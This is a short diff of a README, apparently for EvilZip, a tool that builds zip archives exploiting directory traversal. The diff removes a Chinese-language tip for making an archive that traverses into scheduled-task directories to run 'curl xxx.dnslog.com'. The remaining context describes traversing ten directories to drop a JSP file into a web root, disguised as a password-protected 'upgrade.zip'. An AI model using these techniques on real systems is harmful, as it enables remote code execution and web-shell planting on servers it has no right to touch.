@@ -45,11 +45,6 @@ Usage: java -jar EvilZip.jar [options]
 
 ## 一些tips
 
-快速生成在unix系统执行命令的压缩包(目录穿越到计划任务):
-
-```
-java -jar evilzip.jar -c "curl xxx.dnslog.com"
-```
 
 读取本地的gaga.jsp 让其穿越10层目录最终解压到/wwwroot/xxxx/gaga.jsp 解压密码为update-password 输出的压缩包名为upgrade.zip
 
